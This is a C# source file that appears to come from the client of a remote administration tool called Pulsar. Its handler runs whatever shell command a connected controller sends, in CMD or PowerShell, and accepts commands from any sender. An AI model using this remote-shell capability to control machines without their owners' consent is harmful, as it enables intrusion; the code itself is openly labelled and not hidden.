using Pulsar.Client.IO;
using Pulsar.Client.Networking;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.RemoteShell;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote shell.
    /// </summary>
    public class RemoteShellHandler : IMessageProcessor, IDisposable
    {
        private Shell _shell;
        private readonly PulsarClient _client;
        private bool _disposed;

        public RemoteShellHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected)
                DisposeShell();
        }

        public bool CanExecute(IMessage message)
        {
            return message is DoShellExecute;
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            if (_disposed)
                return;

            if (!(message is DoShellExecute shellMsg))
                return;

            string cmd = shellMsg.Command?.Trim();
            if (string.IsNullOrEmpty(cmd))
                return;

            // Create shell on first command unless it is `exit`
            if (_shell == null && !cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
            {
                _shell = new Shell(_client);
            }

            // No shell running + exit request → nothing to do
            if (_shell == null && cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                return;

            // Special shell-mode switch command (PowerShell / CMD)
            if (cmd.StartsWith("##switchshell::"))
            {
                _shell.ExecuteCommand(cmd);
                return;
            }

            // Exit = close shell instance but NOT handler
            if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
            {
                DisposeShell();
                return;
            }

            // Normal command
            _shell.ExecuteCommand(cmd);
        }

        private void DisposeShell()
        {
            try
            {
                _shell?.Dispose();
            }
            catch
            {
                // cleanup only
            }

            _shell = null;
        }

        public void Dispose()
        {
            if (_disposed)
                return;

            _disposed = true;

            DisposeShell();
            _client.ClientState -= OnClientStateChange;
        }
    }
}
